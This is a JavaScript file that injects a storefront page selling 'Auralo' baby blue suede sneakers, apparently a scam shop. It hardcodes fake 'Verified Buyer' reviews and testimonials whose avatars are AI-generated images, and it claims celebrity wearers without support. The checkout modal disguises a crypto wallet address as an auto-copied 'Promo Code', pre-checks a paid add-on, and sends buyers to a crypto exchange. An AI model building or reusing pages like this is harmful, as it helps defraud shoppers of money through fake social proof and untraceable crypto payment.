// Full content loader - Contains all non-critical functionality
(function() {
    // Add additional HTML content
    const additionalHTML = `
    <!-- Fabric Features Section -->
    <section class="fabric-features-section lazy-section">
        <div class="fabric-features">
            <div class="fabric-feature">
                <div class="feature-icon">🪶</div>
                <div class="feature-label">Soothingly Soft</div>
            </div>
            <div class="fabric-feature">
                <div class="feature-icon">📏</div>
                <div class="feature-label">Pre-Shrunk</div>
            </div>
            <div class="fabric-feature">
                <div class="feature-icon">✨</div>
                <div class="feature-label">Wrinkle Free</div>
            </div>
        </div>
    </section>

    <!-- Product Details Section -->
    <section class="product-details-section lazy-section">
        <div class="detail-dropdown">
            <div class="detail-header" onclick="toggleDetail(this)">
                <div class="detail-title">
                    <span>ℹ️ Description</span>
                </div>
                <span class="detail-arrow">▼</span>
            </div>
            <div class="detail-content">
                <div class="detail-text">
                    Introducing the Auralo Baby Blue Suede Sneakers - where Italian craftsmanship meets contemporary street style.
                    These aren't just sneakers; they're a statement piece that elevates any outfit. Handcrafted in Italy's
                    finest ateliers using premium baby blue suede sourced from Tuscany, each pair undergoes 47 individual
                    quality checks.
                </div>
            </div>
        </div>

        <div class="detail-dropdown">
            <div class="detail-header" onclick="toggleDetail(this)">
                <div class="detail-title">
                    <span>🧵 Materials</span>
                </div>
                <span class="detail-arrow">▼</span>
            </div>
            <div class="detail-content">
                <div class="detail-text">
                    • Upper: 100% Premium Italian Suede (Baby Blue)<br>
                    • Lining: Soft Calfskin Leather<br>
                    • Sole: Margom Rubber (Made in Italy)<br>
                    • Insole: OrthoLite® Cushioned Technology<br>
                    • Construction: Blake Stitch<br>
                    • Handcrafted in Milan, Italy
                </div>
            </div>
        </div>

        <div class="detail-dropdown">
            <div class="detail-header" onclick="toggleDetail(this)">
                <div class="detail-title">
                    <span>📐 Size & Fit</span>
                </div>
                <span class="detail-arrow">▼</span>
            </div>
            <div class="detail-content">
                <div class="detail-text">
                    <strong>Fit:</strong> True to EU Size, Regular Width<br><br>
                    <strong>EU to US Size Conversion:</strong><br>
                    • EU 36 = US Women's 6 / Men's 4<br>
                    • EU 37 = US Women's 7 / Men's 5<br>
                    • EU 38 = US Women's 8 / Men's 6<br>
                    • EU 39 = US Women's 9 / Men's 7<br>
                    • EU 40 = US Women's 10 / Men's 8<br>
                    • EU 41 = US Women's 11 / Men's 9<br>
                    • EU 44 = US Women's 13 / Men's 11
                </div>
            </div>
        </div>
    </section>

    <!-- Worn By Favorites -->
    <section class="worn-by-favorites lazy-section">
        <h2 class="section-header">Worn By Your Favorites</h2>
        <div class="favorites-scroll">
            <div class="favorite-item">
                <img class="favorite-avatar" src="./images/worn-by-favorites/alix-earle.jpg" alt="Alix Earle">
                <div class="favorite-name">Alix Earle</div>
                <div class="favorite-handle">@alixearle</div>
            </div>
            <div class="favorite-item">
                <img class="favorite-avatar" src="./images/worn-by-favorites/monet-mcmichael.jpg" alt="Monet McMichael">
                <div class="favorite-name">Monet McMichael</div>
                <div class="favorite-handle">@monetmcmichael</div>
            </div>
            <div class="favorite-item">
                <img class="favorite-avatar" src="./images/worn-by-favorites/alex-cooper.jpeg" alt="Alex Cooper">
                <div class="favorite-name">Alex Cooper</div>
                <div class="favorite-handle">@alexandracooper</div>
            </div>
        </div>
    </section>

    <!-- Reviews Section -->
    <section class="reviews-section lazy-section">
        <h2 class="section-header">Reviews</h2>
        <div class="reviews-carousel-container">
            <div class="reviews-carousel" id="reviewsCarousel"></div>
            <div class="carousel-dots" id="reviewDots"></div>
        </div>
    </section>

    <!-- Testimonials Section -->
    <section class="testimonials-section lazy-section">
        <h2 class="section-header">Testimonials</h2>
        <div class="testimonial-grid" id="testimonialGrid"></div>
    </section>

    <!-- Sticky Footer -->
    <div class="sticky-footer">
        <button class="sticky-button" onclick="handleAddToCart('preorder')">
            PRE-ORDER - $29
        </button>
    </div>

    <!-- Checkout Modal -->
    <div class="checkout-modal" id="checkoutModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Complete Order with SimpleSwap</h2>
                <button class="modal-close" onclick="closeCheckout()">×</button>
            </div>

            <!-- Order Summary -->
            <div style="padding:15px;background:#f8f8f8;border-radius:8px;margin-bottom:20px">
                <h3 style="margin-bottom:10px">Order Summary</h3>
                <div style="display:flex;justify-content:space-between;margin-bottom:8px">
                    <span>Auralo Baby Blue Suede Sneakers - Size <span id="modalSelectedSize">-</span></span>
                    <span id="checkoutPrice">$69</span>
                </div>
                <div id="bumpSummary"></div>
                <div style="border-top:1px solid #ddd;margin-top:10px;padding-top:10px;display:flex;justify-content:space-between;font-weight:700">
                    <span>Total</span>
                    <span id="totalPrice">$69</span>
                </div>
            </div>

            <!-- Order Bump -->
            <div class="order-bump-section">
                <div style="display:flex;align-items:flex-start;gap:15px">
                    <input type="checkbox" id="orderBumpCheckbox" onchange="updateTotal()" checked style="width:24px;height:24px;cursor:pointer;margin-top:2px">
                    <div style="flex:1">
                        <h4 style="margin:0 0 8px 0;color:#333;font-size:16px;font-weight:600">🎁 Add Luxury Shoe Care Kit - 88% OFF</h4>
                        <p style="margin:0 0 12px 0;color:#666;font-size:13px;line-height:1.5">Protect your investment with our premium Italian leather care kit.</p>
                        <p style="margin:0;font-size:15px"><span style="text-decoration:line-through;color:#999">$80</span> <span style="color:#ff4444;font-weight:600;font-size:18px">$10</span></p>
                    </div>
                </div>
            </div>

            <!-- Promo Code -->
            <div style="background:#e8f5e9;border:2px solid #4caf50;padding:12px;border-radius:8px;margin-bottom:20px;text-align:center">
                <div style="font-size:0.85rem;color:#2e7d32;margin-bottom:5px">Promo Code (Auto-Copied):</div>
                <div style="font-family:monospace;font-size:0.75rem;word-break:break-all;color:#1b5e20;font-weight:600">
                    0xE5173e7c3089bD89cd1341b637b8e1951745ED5C
                </div>
            </div>

            <button class="add-to-cart" onclick="completeCheckout()" style="background:#007BFF;color:white">
                CHECKOUT WITH SIMPLESWAP - <span id="finalTotal">$69</span>
            </button>

            <div style="text-align:center;margin-top:15px;font-size:0.8rem;color:#666">
                <p>🔒 Secure crypto payment via SimpleSwap</p>
                <p>✅ Order ships immediately after payment confirmation</p>
            </div>
        </div>
    </div>
    `;

    // Insert additional content
    document.getElementById('additionalContent').innerHTML = additionalHTML;

    // Review data
    const reviewData = [
        { author: "sofia k.", platform: "tiktok", rating: "⭐⭐⭐⭐⭐", text: "GIRLLLLL these baby blue sneakers are IT!!! the suede is giving expensive & they're actually so comfy", date: "2 days ago" },
        { author: "maya", platform: "instagram", rating: "⭐⭐⭐⭐⭐", text: "ok but why do these auralo sneakers eat up my isabel marants... the italian craftsmanship is chefs kiss besties 🤌", date: "5 days ago" },
        { author: "jess r", platform: "facebook", rating: "⭐⭐⭐⭐", text: "loveeee my baby blues!! the suede is soooo soft & the color is perfect for spring fits", date: "1 week ago" }
    ];

    // Testimonial data
    const testimonialData = [
        { name: "kensey s", date: "11/26/2024", title: "NEED THESE IN EVERY COLOR", text: "okkkk but these baby blue sneakers are EVERYTHING!!", avatar: 1 },
        { name: "dani j", date: "11/25/2024", title: "better than my $800 shoes lol", text: "girlies these auralo sneakers lowkey beat my balenciagas fr...", avatar: 2 },
        { name: "ash b", date: "11/23/2024", title: "my new personality trait", text: "the baby blue literally goes w everything in my closet!!", avatar: 3 }
    ];

    // Render reviews
    function renderReviews() {
        const carousel = document.getElementById('reviewsCarousel');
        const dotsContainer = document.getElementById('reviewDots');

        reviewData.forEach((review, index) => {
            const card = document.createElement('div');
            card.className = 'review-item';
            card.innerHTML = `
                <div class="review-header">
                    <div class="review-author">${review.author}</div>
                    <div class="review-verified">✓ Verified Buyer</div>
                </div>
                <div class="review-rating">${review.rating}</div>
                <div class="review-content">${review.text}</div>
                <div class="review-footer">
                    <span>${review.date}</span>
                </div>
            `;
            carousel.appendChild(card);

            const dot = document.createElement('div');
            dot.className = 'carousel-dot' + (index === 0 ? ' active' : '');
            dotsContainer.appendChild(dot);
        });
    }

    // Render testimonials
    function renderTestimonials() {
        const grid = document.getElementById('testimonialGrid');
        testimonialData.forEach((item) => {
            const card = document.createElement('div');
            card.className = 'testimonial-item';
            card.innerHTML = `
                <img class="testimonial-image" src="./images/testimonials/Generated Image September 28, 2025 - 11_16AM (${item.avatar}).png" alt="${item.name}">
                <div class="testimonial-content-wrapper">
                    <div class="testimonial-name">${item.name}</div>
                    <div class="verified-badge">✓ Verified Buyer | ${item.date}</div>
                    <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
                    <div class="testimonial-title">${item.title}</div>
                    <div class="testimonial-text">${item.text}</div>
                </div>
            `;
            grid.appendChild(card);
        });
    }

    // Initialize content
    renderReviews();
    renderTestimonials();

    // Fade in lazy sections
    setTimeout(() => {
        document.querySelectorAll('.lazy-section').forEach(section => {
            section.classList.add('loaded');
        });
    }, 100);

    // Define global functions
    window.toggleDetail = function(header) {
        const content = header.nextElementSibling;
        const arrow = header.querySelector('.detail-arrow');
        const isOpen = content.style.display === 'block';

        content.style.display = isOpen ? 'none' : 'block';
        arrow.textContent = isOpen ? '▼' : '▲';
    };

    window.showCheckoutModal = function(type) {
        const modal = document.getElementById('checkoutModal');
        const sizeSpan = document.getElementById('modalSelectedSize');
        const checkoutPrice = document.getElementById('checkoutPrice');

        if (sizeSpan) sizeSpan.textContent = selectedSize || '-';
        if (checkoutPrice) checkoutPrice.textContent = type === 'preorder' ? '$29' : '$69';

        updateTotal();

        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
    };

    window.closeCheckout = function() {
        const modal = document.getElementById('checkoutModal');
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    };

    window.updateTotal = function() {
        const checkbox = document.getElementById('orderBumpCheckbox');
        const checkoutData = JSON.parse(sessionStorage.getItem('checkoutData') || '{}');
        const basePrice = checkoutData.type === 'preorder' ? 29 : 69;
        const bumpPrice = checkbox && checkbox.checked ? 10 : 0;
        const total = basePrice + bumpPrice;

        document.getElementById('totalPrice').textContent = '$' + total;
        document.getElementById('finalTotal').textContent = '$' + total;

        const bumpSummary = document.getElementById('bumpSummary');
        if (bumpSummary) {
            if (bumpPrice > 0) {
                bumpSummary.innerHTML = '<div style="display:flex;justify-content:space-between;margin-bottom:8px"><span>Luxury Shoe Care Kit</span><span>$10</span></div>';
            } else {
                bumpSummary.innerHTML = '';
            }
        }
    };

    window.completeCheckout = function() {
        window.location.href = 'https://simpleswap.io';
    };
})();